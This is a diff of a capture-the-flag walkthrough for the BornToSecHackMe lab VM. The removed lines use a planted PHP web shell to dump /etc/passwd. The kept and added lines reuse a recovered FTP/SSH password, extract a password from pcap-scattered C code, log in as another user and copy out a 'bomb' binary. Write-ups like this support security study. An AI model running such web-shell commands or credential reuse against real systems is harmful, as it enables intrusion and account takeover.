@@ -166,47 +166,6 @@ We retrieve the name of our user:
 www-data
 ```
 
-We list the other users:
-
-```bash
-└─$ curl -k https://192.168.1.22/forum/templates_c/curl_shell.php?cmd=cat+/etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-sys:x:3:3:sys:/dev:/bin/sh
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/bin/sh
-man:x:6:12:man:/var/cache/man:/bin/sh
-lp:x:7:7:lp:/var/spool/lpd:/bin/sh
-mail:x:8:8:mail:/var/mail:/bin/sh
-news:x:9:9:news:/var/spool/news:/bin/sh
-uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
-proxy:x:13:13:proxy:/bin:/bin/sh
-www-data:x:33:33:www-data:/var/www:/bin/sh
-backup:x:34:34:backup:/var/backups:/bin/sh
-list:x:38:38:Mailing List Manager:/var/list:/bin/sh
-irc:x:39:39:ircd:/var/run/ircd:/bin/sh
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
-nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
-libuuid:x:100:101::/var/lib/libuuid:/bin/sh
-syslog:x:101:103::/home/syslog:/bin/false
-messagebus:x:102:106::/var/run/dbus:/bin/false
-whoopsie:x:103:107::/nonexistent:/bin/false
-landscape:x:104:110::/var/lib/landscape:/bin/false
-sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
-ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
-mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false
-ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false
-lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
-laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
-laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
-thor:x:1004:1004:,,,:/home/thor:/bin/bash
-zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
-dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
-dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false
-postfix:x:110:118::/var/spool/postfix:/bin/false
-```
-
 We can look now for all the files our current user has created:
 
 ```bash
@@ -234,16 +193,116 @@ Password of lmezard : `G!@M6f4Eatau{sF"`
 We can now try to connect in ssh to our VM.
 ```bash
 └─$ ssh lmezard@192.168.1.22
-        ____                _______    _____
-       |  _ \              |__   __|  / ____|
-       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
-       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
-       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
-       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
-
-                       Good luck & Have fun
+...
 lmezard@192.168.1.22's password:
 Permission denied, please try again.
 ```
 too bad, let's try again with the `ssh` port finded with nmap before, it's not working neither...
-Let's try with the `ftp` port 21 with an external software and `lmezard` credential. It's working !! Now we have access to a file `README` and `fun`. The readme file say that we have to resolve the puzzle to get the password for the user `laurie`.
+Let's try with the `ftp` port 21 with an external software and `lmezard` credential. It's working !! Now we have access to a file `README` and `fun`. The readme file say that we have to resolve the puzzle to get the password for the user `laurie`.  First let's download the `fun` file on our computer and second let's get some info about it:
+
+```bash
+└─$ file fun
+fun: POSIX tar archive (GNU)
+```
+
+The `fun` file seems to be a tared file, so we should untar it first:  
+```bash
+└─$ sudo tar xvf fun
+...
+ft_fun/DFO1G.pcap
+ft_fun/G3VJZ.pcap
+ft_fun/Y8S1M.pcap
+```
+
+Now we have a folder called `ft_fun` with a lot of `pcap` files.
+
+We can find a `main`: 
+```bash
+└─$ grep main * -A35 -B2
+BJPCP.pcap-     printf("Hahahaha Got you!!!\n");
+BJPCP.pcap-}*/
+BJPCP.pcap:int main() {
+BJPCP.pcap-     printf("M");
+BJPCP.pcap-     printf("Y");
+BJPCP.pcap-     printf(" ");
+BJPCP.pcap-     printf("P");
+BJPCP.pcap-     printf("A");
+BJPCP.pcap-     printf("S");
+BJPCP.pcap-     printf("S");
+BJPCP.pcap-     printf("W");
+BJPCP.pcap-     printf("O");
+BJPCP.pcap-     printf("R");
+BJPCP.pcap-     printf("D");
+BJPCP.pcap-     printf(" ");
+BJPCP.pcap-     printf("I");
+BJPCP.pcap-     printf("S");
+BJPCP.pcap-     printf(":");
+BJPCP.pcap-     printf(" ");
+BJPCP.pcap-     printf("%c",getme1());
+BJPCP.pcap-     printf("%c",getme2());
+BJPCP.pcap-     printf("%c",getme3());
+BJPCP.pcap-     printf("%c",getme4());
+BJPCP.pcap-     printf("%c",getme5());
+BJPCP.pcap-     printf("%c",getme6());
+BJPCP.pcap-     printf("%c",getme7());
+BJPCP.pcap-     printf("%c",getme8());
+BJPCP.pcap-     printf("%c",getme9());
+BJPCP.pcap-     printf("%c",getme10());
+BJPCP.pcap-     printf("%c",getme11());
+BJPCP.pcap-     printf("%c",getme12());
+BJPCP.pcap-     printf("\n");
+BJPCP.pcap-     printf("Now SHA-256 it and submit");
+BJPCP.pcap-}
+BJPCP.pcap-/*
+BJPCP.pcap-void useless() {
+BJPCP.pcap-     printf("Hahahaha Got you!!!\n");
+BJPCP.pcap-}void useless() {
+```
+
+Now we have to find all the `getme` files. We can find some with `grep "getme" * -A5` But some other are dispatched in mutiples files. By following the next files we can get the actual codes of the functions. After this we just have to compile and execute the `c` code: 
+```bash
+└─$ gcc main.c
+
+└─$ ./a.out
+MY PASSWORD IS: Iheartpwnage
+Now SHA-256 it and submi
+
+└─$ echo -n "Iheartpwnage" | sha256sum
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+```
+
+Now we can try again to connect in ssh with user `laurie` and password `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` :
+
+```bash
+└─$ ssh laurie@192.168.1.22
+...
+laurie@192.168.1.22's password:
+laurie@BornToSecHackMe:~$ ls
+bomb  README
+
+laurie@BornToSecHackMe:~$ cat README
+Diffuse this bomb!
+When you have all the password use it as "thor" user with ssh.
+
+HINT:
+P
+ 2
+ b
+
+o
+4
+
+NO SPACE IN THE PASSWORD (password is case sensitive).
+```
+
+It seems that we must find passwords by diffusing the `bomb` file..
+We copy the `bomb` file to disassemble it with`ghidra` or `gdb`:
+
+```bash
+└─$ scp -r -p laurie@192.168.1.22:bomb .
+...
+laurie@192.168.1.22's password: 
+bomb                                                                                               100%   26KB   6.1MB/s   00:00    
+```
+
+We realize that we have to solve different phases to diffuse the bomb.
